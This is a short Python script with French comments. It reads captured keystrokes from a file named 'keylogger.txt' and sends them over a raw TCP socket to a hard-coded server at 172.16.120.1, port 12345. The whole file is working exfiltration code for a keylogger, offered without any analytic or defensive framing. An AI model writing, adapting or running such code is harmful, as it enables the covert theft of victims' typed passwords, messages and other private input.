import socket

def read_data_from_file(file_path):
    with open(file_path, 'r') as file:
        data = file.read()
    return data

def main():
    host = '172.16.120.1'
    port = 12345 

    file_path = 'keylogger.txt'  

    # Lire les données du fichier
    keyboard_data = read_data_from_file(file_path)

    # Connexion au serveur
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    # Envoyer les données au serveur
    client_socket.send(keyboard_data.encode('utf-8'))

    client_socket.close()

if __name__ == "__main__":
    main()
